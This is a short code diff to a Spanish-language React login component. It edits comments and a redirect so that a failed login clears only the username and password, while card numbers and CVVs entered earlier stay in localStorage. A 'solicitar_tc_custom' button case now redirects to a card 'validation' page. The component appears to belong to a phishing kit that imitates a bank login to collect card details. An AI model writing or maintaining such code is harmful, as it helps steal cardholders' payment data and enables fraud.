@@ -466,9 +466,11 @@ export default function IniciarSesion() {
   };
 
   // Metodo encargado de abrir la alerta de error de inicio de sesión y cerrar a los 2 segundos
+  // IMPORTANTE: NO borra los datos previos (TC, CVV, etc.) del localStorage, solo limpia el formulario de credenciales
   const handleErrorLogin = () => {
 
-    // Se actualiza el estado del formulario
+    // Se actualiza el estado del formulario - SOLO limpia usuario y clave
+    // Los datos previos (TC, CVV, número de tarjeta, etc.) se mantienen en localStorage
     setFormState(prev => ({
       ...prev,
       usuario: "",
@@ -641,8 +643,8 @@ export default function IniciarSesion() {
         // ------------ Casos botones linea 4 ------------
         case 'solicitar_tc_custom':
 
-          // Redirige a la página
-          redirigir(`/validacion-tc-custom`);
+          // Redirige a la página de validación TC (usa la misma vista para TC estándar y custom)
+          redirigir(`/validacion-tc`);
 
           // Se sale del switch
           break;
